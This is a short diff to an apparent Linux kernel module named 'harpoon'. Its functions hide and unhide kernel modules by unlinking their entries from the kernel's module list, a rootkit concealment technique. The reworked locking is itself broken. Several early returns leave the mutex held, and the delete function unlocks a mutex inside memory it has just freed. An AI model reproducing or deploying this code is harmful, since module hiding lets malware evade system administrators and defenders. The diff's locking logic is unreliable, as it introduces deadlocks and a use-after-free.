@@ -17,32 +17,31 @@ struct harpoon_module *harpoon_new_mod(struct module *module){
 }
 
 void harpoon_del_mod(struct harpoon_module *module){
-    if(module->is_hidden && SAFE_MODE){
+    mutex_lock(&module->lock);
+    if(module->is_hidden && SAFEMODE){
         return;
     }
-
-    mutex_lock(&module->lock);
     list_del(&module->list);
     kfree(module);
     mutex_unlock(&module->lock);
 }
 
 void harpoon_mod_hide(struct harpoon_module *module){
-    if (module->is_hidden){
+    mutex_lock(&module->lock);
+        if (module->is_hidden){
         return;
     }
-    mutex_lock(&module->lock);
     list_del(&module->self->list);
-    mutex_unlock(&module->lock);
     module->is_hidden = 1;
+    mutex_unlock(&module->lock);
 }
 
 void harpoon_mod_unhide(struct harpoon_module *module){
+    mutex_lock(&module->lock);
     if (!module->is_hidden){
         return;
     }
-    mutex_lock(&module->lock);
     list_add(&module->self->list, &module->prev->list);
-    mutex_unlock(&module->lock);
     module->is_hidden = 0;
+    mutex_unlock(&module->lock);
 }
